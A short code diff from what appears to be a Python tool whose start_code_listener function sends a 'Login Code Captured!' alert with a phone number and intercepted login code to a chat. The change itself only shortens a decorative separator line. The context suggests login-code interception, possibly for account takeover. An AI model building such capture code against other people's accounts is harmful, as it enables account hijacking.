@@ -290,9 +290,7 @@ async def start_code_listener(
                     chat_id,
                     (
                         "\U0001f511 <b>Login Code Captured!</b>\n"
-                        "\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501"
-                        "\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501"
-                        "\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n\n"
+                        "\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n\n"
                         f"\U0001f4f1  Phone: <b>{phone}</b>\n"
                         f"\U0001f510  Code: <code>{captured['code']}</code>"
                         "\n\n"
